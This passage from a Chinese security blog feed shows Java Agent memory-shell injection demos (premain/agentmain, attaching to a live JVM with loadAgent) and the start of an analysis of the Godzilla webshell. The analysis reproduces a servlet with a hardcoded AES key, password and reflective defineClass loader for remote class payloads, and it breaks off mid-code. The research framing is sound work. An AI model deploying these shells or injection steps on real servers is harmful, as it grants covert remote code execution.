punctuation">(</span><span class="token string">"premain method is invoked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过mvn或者mf文件打生成jar包：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">DemoTest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用javac生成class文件之后打包：<code>jar cvfm agent.jar agent.mf DemoTest.class</code></p><p>然后再创建一个普通的类<code>Hello.java</code>和mf文件:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mf文件:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Main</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">Hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同样打包为jar: <code>jar cvfm hello.jar hello.mf Hello.class</code></p><p>接下来运行的时候增加-javaagent:agent.jar: <code>java -javaagent:agent.jar=Hello -jar hello.jar</code><br><img src="/2022/06/23/java-agent-shell/2.png"></p><h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>首先对这种方式有一个初步的认识，需要三个文件：</p><h4 id="App-java"><a href="#App-java" class="headerlink" title="App.java"></a>App.java</h4><p>循环输出，模拟运行的应用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">ManagementFactory</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> pid <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Pid is:"</span> <span class="token operator">+</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">500</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App is Running!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AgentDemo-java"><a href="#AgentDemo-java" class="headerlink" title="AgentDemo.java"></a>AgentDemo.java</h4><p>实现<code>agentmain</code>功能，用于agent的功能实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Surprise! I'm Agent Smith"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Inject-java"><a href="#Inject-java" class="headerlink" title="Inject.java"></a>Inject.java</h4><p>通过VirtualMachine的<code>loadAgent</code>方式，把Agent注入正在运行的App里：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachine</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> pid <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> jarName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">VirtualMachine</span> vm <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>jarName<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上三个java文件通过IDEA打包为Jar文件，首先运行App.jar：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.App<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用Inject.jar注入进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.Inject <span class="token number">22932</span> /var/tmp/AgentDemo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到App.jar的输出被动态的改变了：<br><img src="/2022/06/23/java-agent-shell/3.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://wjlshare.com/archives/1582">浅谈Java Agent内存马</a></li><li><a href="https://su18.org/post/irP0RsYK1/">Java Instrumentation</a></li><li><a href="https://developer.aliyun.com/article/857055">偷天换日，用JavaAgent欺骗你的JVM</a></li><li><a href="https://y4er.com/post/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></li><li><a href="https://www.freebuf.com/articles/web/323621.html">擅长捉弄的内存马同学：Agent内存马（低卡)</a></li><li><a href="https://xz.aliyun.com/t/9450">Java Agent从入门到内存马</a></li><li><a href="https://www.cnblogs.com/wh4am1/p/15996108.html">瞒天过海计之Tomcat隐藏内存马</a></li><li><a href="https://mp.weixin.qq.com/s/OLNznd14NlzEzeGelRLV9g">Java安全-记一次实战使用memoryshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉原理分析</title>
      <link href="/2022/05/17/godzilla.html"/>
      <url>/2022/05/17/godzilla.html</url>
      
        <content type="html"><![CDATA[<h2 id="分析背景"><a href="#分析背景" class="headerlink" title="分析背景"></a>分析背景</h2><p>起源于<code>Y4er</code>师傅发的两篇文章：</p><ul><li><a href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li></ul><p>对其中的原因比较好奇，所以尝试对哥斯拉做了一次原理分析，测试代码在<a href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>。文章可能有错误的地方，可以在<a href="https://github.com/JKme/JKme.github.io/issues">issue</a>留言。</p><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>从哥斯拉的源代码里面扣出来<code>godzilla\shells\payloads\java\assets\payload.classs</code>文件，使用<a href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>反编译之后，在idea里面新建<code>payload.java</code>文件，然后修改误报错，<a href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">这里</a>是反编译好之后的文件。<code>payload.java</code>实现了大部分的shell操作，比如查看文件、执行命令、数据库连接等等</p><p>新建一个<code>HelloServlet.java</code>，用于动态调试：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//定义AES加解密的Key，哥斯拉会把返回的response也做一次加密</span>    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>           <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//用于返回response在头和尾部插入标识符，头部取md5的前16位字符串，尾部取md5的后16位字符串</span>    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据m的值判断是加密还是解密，m是true的时候变量为1，这时候表示加密模式，反之是解密模式</span>            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token 